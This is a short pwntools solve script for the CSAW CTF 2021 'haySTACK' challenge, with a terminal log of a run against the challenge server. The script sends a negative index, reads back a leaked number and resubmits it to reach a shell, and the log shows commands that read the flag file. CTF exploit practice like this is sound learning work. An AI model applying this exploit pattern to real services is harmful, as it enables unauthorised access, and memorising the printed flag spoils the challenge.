from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './haySTACK'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "pwn.chal.csaw.io"
  PORT = 5002
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil("Which haystack do you want to check?\n")
s.sendline("-22")

s.recvuntil("but it's number is ")
num = int(s.recvuntil(".")[:-1], 16)
print "num =", num

s.recvuntil("Which haystack do you want to check?\n")
s.sendline(str(num))

s.interactive()

'''
mito@ubuntu:~/CTF/CSAW_CTF_Qualification_Round_2021/Pwn_haySTACK$ python solve.py r
[*] '/home/mito/CTF/CSAW_CTF_Qualification_Round_2021/Pwn_haySTACK/haySTACK'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn.chal.csaw.io on port 5002: Done
num = 452643
[*] Switching to interactive mode
Hey you found a needle! And its number is 0x00001337! That's it!
$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
$ ls -l
total 20
-r--r--r-- 1 root root    40 Sep  6 17:36 flag.txt
-r-xr-xr-x 1 root root 14496 Sep  7 01:07 haySTACK
$ cat flag.txt
flag{4lw4YS_r3m3mB3R_2_ch3CK_UR_st4cks}
'''
